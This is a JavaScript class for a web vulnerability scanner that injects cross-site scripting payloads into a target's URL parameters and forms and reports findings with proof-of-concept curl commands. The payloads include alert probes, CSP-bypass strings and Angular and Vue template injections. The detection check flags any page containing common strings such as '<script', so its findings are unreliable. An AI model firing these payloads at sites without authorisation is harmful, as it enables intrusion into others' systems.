
import { PayloadGenerator } from '../../payloads/PayloadGenerator.js';

export class XSSScanner {
  constructor(scanner) {
    this.scanner = scanner;
    this.payloadGenerator = new PayloadGenerator();
    this.logger = scanner.logger;
    this.xssPayloads = this.payloadGenerator.generatePayloads('xss', {
      applyEncoding: true,
      applyBypasses: true,
      generateMutations: true
    });
  }

  async scan() {
    this.logger.info('🔍 Starting comprehensive XSS vulnerability scan');
    
    try {
      await this.scanReflectedXSS();
      await this.scanStoredXSS();
      await this.scanDOMXSS();
      await this.scanCSPBypass();
      await this.scanFrameworkSpecificXSS();
      await this.scanPostMessageXSS();
      await this.scanWebSocketXSS();
      
      this.logger.info('✅ XSS scan completed');
    } catch (error) {
      this.logger.error('❌ Error in XSS scanner:', error);
    }
  }

  async scanReflectedXSS() {
    this.logger.debug('Testing for Reflected XSS vulnerabilities');
    
    const testUrls = await this.discoverTestableParameters();
    
    for (const urlData of testUrls) {
      for (const payload of this.xssPayloads) {
        try {
          const testUrl = this.buildTestUrl(urlData.url, urlData.parameters, payload);
          const response = await this.scanner.makeRequest(testUrl, {
            headers: {
              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
              'Accept-Language': 'en-US,en;q=0.5'
            }
          });

          if (this.detectXSSInResponse(response, payload)) {
            await this.reportXSSVulnerability({
              type: 'Reflected XSS',
              url: testUrl,
              payload: payload,
              response: response,
              parameter: urlData.parameters[0] || 'unknown',
              method: 'GET'
            });
          }
        } catch (error) {
          this.logger.debug('Request failed:', error.message);
        }
      }
    }
  }

  async scanStoredXSS() {
    this.logger.debug('Testing for Stored XSS vulnerabilities');
    
    const forms = await this.discoverForms();
    
    for (const form of forms) {
      for (const payload of this.xssPayloads) {
        try {
          // Submit payload via form
          const submitResponse = await this.submitForm(form, payload);
          
          if (submitResponse.status < 400) {
            // Check if payload is stored and reflected
            const verifyResponse = await this.scanner.makeRequest(form.action || this.scanner.target);
            
            if (this.detectXSSInResponse(verifyResponse, payload)) {
              await this.reportXSSVulnerability({
                type: 'Stored XSS',
                url: form.action || this.scanner.target,
                payload: payload,
                response: verifyResponse,
                form: form,
                method: form.method || 'POST'
              });
            }
          }
        } catch (error) {
          this.logger.debug('Form submission failed:', error.message);
        }
      }
    }
  }

  async scanDOMXSS() {
    this.logger.debug('Testing for DOM-based XSS vulnerabilities');
    
    const domPayloads = [
      '#<script>alert("DOM-XSS")</script>',
      '#<img src=x onerror=alert("DOM-XSS")>',
      '#javascript:alert("DOM-XSS")',
      '#data:text/html,<script>alert("DOM-XSS")</script>'
    ];

    for (const payload of domPayloads) {
      try {
        const testUrl = this.scanner.target + payload;
        const response = await this.scanner.makeRequest(testUrl);
        
        // Check for DOM XSS indicators
        if (this.detectDOMXSS(response, payload)) {
          await this.reportXSSVulnerability({
            type: 'DOM-based XSS',
            url: testUrl,
            payload: payload,
            response: response,
            method: 'GET'
          });
        }
      } catch (error) {
        this.logger.debug('DOM XSS test failed:', error.message);
      }
    }
  }

  async scanCSPBypass() {
    this.logger.debug('Testing for CSP bypass vulnerabilities');
    
    const cspBypassPayloads = [
      '<script src="data:,alert(1)"></script>',
      '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<object data="javascript:alert(1)"></object>',
      '<embed src="javascript:alert(1)"></embed>',
      '<link rel="import" href="javascript:alert(1)">',
      '<script>Function("alert(1)")()</script>'
    ];

    for (const payload of cspBypassPayloads) {
      await this.testPayloadInContext(payload, 'CSP Bypass XSS');
    }
  }

  async scanFrameworkSpecificXSS() {
    this.logger.debug('Testing for framework-specific XSS vulnerabilities');
    
    // AngularJS payloads
    const angularPayloads = [
      '{{constructor.constructor("alert(1)")()}}',
      '{{7*7}}',
      '{{this}}',
      '{{$eval.constructor("alert(1)")()}}',
      '{{$new.constructor("alert(1)")()}}'
    ];

    // Vue.js payloads
    const vuePayloads = [
      '{{constructor.constructor("alert(1)")()}}',
      '{{7*7}}',
      '{{$el.ownerDocument.defaultView.alert(1)}}'
    ];

    // React payloads
    const reactPayloads = [
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>'
    ];

    const allFrameworkPayloads = [...angularPayloads, ...vuePayloads, ...reactPayloads];
    
    for (const payload of allFrameworkPayloads) {
      await this.testPayloadInContext(payload, 'Framework-specific XSS');
    }
  }

  async scanPostMessageXSS() {
    this.logger.debug('Testing for PostMessage XSS vulnerabilities');
    
    const postMessagePayload = `
      <script>
        window.addEventListener('message', function(e) {
          document.body.innerHTML = e.data;
        });
        window.postMessage('<img src=x onerror=alert("PostMessage-XSS")>', '*');
      </script>
    `;

    await this.testPayloadInContext(postMessagePayload, 'PostMessage XSS');
  }

  async scanWebSocketXSS() {
    this.logger.debug('Testing for WebSocket XSS vulnerabilities');
    
    // This would require WebSocket connection testing
    // For now, we'll test for WebSocket endpoints that might be vulnerable
    const wsEndpoints = [
      '/ws',
      '/websocket',
      '/socket.io',
      '/sockjs'
    ];

    for (const endpoint of wsEndpoints) {
      try {
        const testUrl = this.scanner.target.replace('http', 'ws') + endpoint;
        // Note: Actual WebSocket testing would require ws library
        this.logger.debug(`WebSocket endpoint discovered: ${testUrl}`);
      } catch (error) {
        this.logger.debug('WebSocket test failed:', error.message);
      }
    }
  }

  async testPayloadInContext(payload, type) {
    const testUrls = await this.discoverTestableParameters();
    
    for (const urlData of testUrls) {
      try {
        const testUrl = this.buildTestUrl(urlData.url, urlData.parameters, payload);
        const response = await this.scanner.makeRequest(testUrl);
        
        if (this.detectXSSInResponse(response, payload)) {
          await this.reportXSSVulnerability({
            type: type,
            url: testUrl,
            payload: payload,
            response: response,
            method: 'GET'
          });
        }
      } catch (error) {
        this.logger.debug('Context test failed:', error.message);
      }
    }
  }

  async discoverTestableParameters() {
    const urls = [];
    
    try {
      const response = await this.scanner.makeRequest(this.scanner.target);
      
      // Extract URLs with parameters from HTML
      const urlRegex = /(?:href|src|action)=['"]([^'"]*\?[^'"]*)['"]/gi;
      let match;
      
      while ((match = urlRegex.exec(response.data)) !== null) {
        const url = match[1];
        const [baseUrl, queryString] = url.split('?');
        
        if (queryString) {
          const parameters = queryString.split('&').map(param => param.split('=')[0]);
          urls.push({
            url: baseUrl,
            parameters: parameters
          });
        }
      }
      
      // Add common parameter names if no URLs found
      if (urls.length === 0) {
        const commonParams = ['q', 'search', 'query', 'id', 'page', 'category', 'name', 'value'];
        urls.push({
          url: this.scanner.target,
          parameters: commonParams
        });
      }
    } catch (error) {
      this.logger.debug('Parameter discovery failed:', error.message);
      // Fallback to basic test
      urls.push({
        url: this.scanner.target,
        parameters: ['test']
      });
    }
    
    return urls;
  }

  async discoverForms() {
    const forms = [];
    
    try {
      const response = await this.scanner.makeRequest(this.scanner.target);
      
      // Extract forms from HTML (basic regex approach)
      const formRegex = /<form[^>]*>/gi;
      const matches = response.data.match(formRegex) || [];
      
      for (const formTag of matches) {
        const actionMatch = formTag.match(/action=['"]([^'"]*)['"]/i);
        const methodMatch = formTag.match(/method=['"]([^'"]*)['"]/i);
        
        forms.push({
          action: actionMatch ? actionMatch[1] : this.scanner.target,
          method: methodMatch ? methodMatch[1].toUpperCase() : 'POST'
        });
      }
    } catch (error) {
      this.logger.debug('Form discovery failed:', error.message);
    }
    
    return forms;
  }

  buildTestUrl(baseUrl, parameters, payload) {
    const url = new URL(baseUrl, this.scanner.target);
    
    // Add payload to first parameter
    if (parameters.length > 0) {
      url.searchParams.set(parameters[0], payload);
    } else {
      url.searchParams.set('test', payload);
    }
    
    return url.toString();
  }

  async submitForm(form, payload) {
    const formData = new URLSearchParams();
    formData.append('test', payload);
    formData.append('name', payload);
    formData.append('comment', payload);
    formData.append('message', payload);
    
    return await this.scanner.makeRequest(form.action, {
      method: form.method,
      data: formData.toString(),
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    });
  }

  detectXSSInResponse(response, payload) {
    if (!response || !response.data) return false;
    
    const responseBody = response.data.toLowerCase();
    const cleanPayload = payload.toLowerCase();
    
    // Check for direct payload reflection
    if (responseBody.includes(cleanPayload)) {
      return true;
    }
    
    // Check for script execution indicators
    const xssIndicators = [
      '<script',
      'javascript:',
      'onerror=',
      'onload=',
      'alert(',
      'confirm(',
      'prompt(',
      'eval(',
      'document.cookie'
    ];
    
    for (const indicator of xssIndicators) {
      if (responseBody.includes(indicator.toLowerCase())) {
        return true;
      }
    }
    
    return false;
  }

  detectDOMXSS(response, payload) {
    if (!response || !response.data) return false;
    
    const responseBody = response.data.toLowerCase();
    
    // Check for DOM manipulation indicators
    const domIndicators = [
      'innerhtml',
      'document.write',
      'document.writeln',
      'eval(',
      'settimeout',
      'setinterval',
      'location.hash',
      'window.name'
    ];
    
    return domIndicators.some(indicator => 
      responseBody.includes(indicator) && responseBody.includes(payload.toLowerCase())
    );
  }

  async reportXSSVulnerability(details) {
    const vulnerability = {
      title: `Cross-Site Scripting (XSS) - ${details.type}`,
      severity: this.calculateXSSSeverity(details.type),
      category: 'XSS',
      type: details.type,
      url: details.url,
      method: details.method,
      parameter: details.parameter,
      payload: details.payload,
      evidence: this.extractEvidence(details.response, details.payload),
      impact: this.getXSSImpact(details.type),
      recommendation: this.getXSSRecommendation(details.type),
      owasp: ['A7 - Cross-Site Scripting (XSS)'],
      cwe: 'CWE-79',
      cvss: this.calculateCVSS(details.type),
      poc: this.generateXSSPOC(details),
      steps: this.generateXSSSteps(details)
    };

    this.scanner.addVulnerability(vulnerability);
  }

  calculateXSSSeverity(type) {
    const severityMap = {
      'Stored XSS': 'High',
      'Reflected XSS': 'Medium',
      'DOM-based XSS': 'Medium',
      'CSP Bypass XSS': 'High',
      'Framework-specific XSS': 'Medium',
      'PostMessage XSS': 'Medium',
      'WebSocket XSS': 'Medium'
    };
    
    return severityMap[type] || 'Medium';
  }

  getXSSImpact(type) {
    const impacts = {
      'Stored XSS': 'Persistent script execution affecting all users, potential for session hijacking, account takeover, and malware distribution',
      'Reflected XSS': 'Script execution in user context, potential for session hijacking and phishing attacks',
      'DOM-based XSS': 'Client-side script execution, potential for data theft and unauthorized actions',
      'CSP Bypass XSS': 'Bypass of Content Security Policy, allowing script execution despite security controls',
      'Framework-specific XSS': 'Framework template injection leading to script execution',
      'PostMessage XSS': 'Cross-origin script execution through PostMessage API abuse',
      'WebSocket XSS': 'Real-time script injection through WebSocket communications'
    };
    
    return impacts[type] || 'Script execution in user context';
  }

  getXSSRecommendation(type) {
    return [
      'Implement proper output encoding/escaping for all user input',
      'Use Content Security Policy (CSP) with strict directives',
      'Validate and sanitize all input on both client and server side',
      'Use secure coding practices and frameworks with built-in XSS protection',
      'Implement HTTP security headers (X-XSS-Protection, X-Content-Type-Options)',
      'Regular security testing and code review',
      'Use template engines with auto-escaping features'
    ].join('; ');
  }

  calculateCVSS(type) {
    const cvssMap = {
      'Stored XSS': '6.1', // Medium
      'Reflected XSS': '6.1', // Medium  
      'DOM-based XSS': '6.1', // Medium
      'CSP Bypass XSS': '7.5', // High
      'Framework-specific XSS': '6.1', // Medium
      'PostMessage XSS': '6.1', // Medium
      'WebSocket XSS': '6.1' // Medium
    };
    
    return cvssMap[type] || '6.1';
  }

  extractEvidence(response, payload) {
    if (!response || !response.data) return 'No response data';
    
    const lines = response.data.split('\n');
    const evidenceLines = [];
    
    for (let i = 0; i < lines.length; i++) {
      if (lines[i].toLowerCase().includes(payload.toLowerCase())) {
        evidenceLines.push(`Line ${i + 1}: ${lines[i].trim()}`);
      }
    }
    
    return evidenceLines.length > 0 ? evidenceLines.join('\n') : 'Payload reflected in response';
  }

  generateXSSPOC(details) {
    return {
      description: `Proof of Concept for ${details.type}`,
      steps: [
        `1. Navigate to: ${details.url}`,
        `2. Insert payload: ${details.payload}`,
        `3. Submit request using ${details.method} method`,
        `4. Observe script execution in browser`
      ],
      curl: this.generateCurlCommand(details),
      expectedResult: 'JavaScript alert dialog should appear, confirming XSS vulnerability'
    };
  }

  generateXSSSteps(details) {
    return [
      'Access the vulnerable URL',
      'Inject the XSS payload in the vulnerable parameter',
      'Submit the request',
      'Observe the payload execution in the response',
      'Confirm that user input is not properly sanitized'
    ];
  }

  generateCurlCommand(details) {
    if (details.method === 'GET') {
      return `curl -X GET "${details.url}"`;
    } else {
      return `curl -X ${details.method} -d "test=${encodeURIComponent(details.payload)}" "${details.url}"`;
    }
  }
}
